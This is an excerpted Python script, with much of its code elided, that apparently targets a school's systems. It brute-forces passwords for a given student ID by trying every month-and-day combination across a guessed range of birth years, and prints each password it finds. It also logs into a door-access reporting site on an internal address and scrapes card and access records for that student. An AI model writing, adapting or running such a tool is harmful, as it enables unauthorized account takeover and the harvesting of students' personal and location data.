...
def get_info(query_id: str) -> dict | None:
    try:
        ...
        if response.status_code != 200:
            print(
                f"Request failed when getting API for {query_id}: {response.status_code}"
            )
            return
...
def get_password(query_id: str, min_year: int, max_year: int) -> str | None:
        ...
        for mth in range(1, 13):
            ...
            for days in range(1, 32):
                ...
                replace_printed_line(
                    "\rAttempting password of " + query_id + ": " + password
                )
                ...
                if dic[0]["strStatus"] == "{ok}":
                    replace_printed_line(
                        "Successfully found password for " + query_id + ": " + password
                    )
...
def get_card(query_id):
    ...
    id_api_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        id_api = requests.session()
        id_api.post(
            "http://192.168.80.106/DoorReport/Login.aspx",
            data=id_api_login,
            headers=id_api_headers,
        )
        d = {
            "__LASTFOCUS": "",
        ...
        id_api_main = id_api.post(
            "http://192.168.80.106/DoorReport/Report_Access.aspx", data=d
        )
        # print(id_api_main.status_code)
        id_api_soup = BeautifulSoup(id_api_main.content, "html.parser")
        result = id_api_soup.body.find("td", width="850px", valign="top").find(
            "tr", bgcolor="#E3EAEB"
        )
        if result is None:
            return None
...
def get_student_info(query_id: str, guess_min_year: int, guess_max_year: int):
    ...
    if info is None:
        replace_printed_line(f"Getting info for {query_id}: None")
        return None
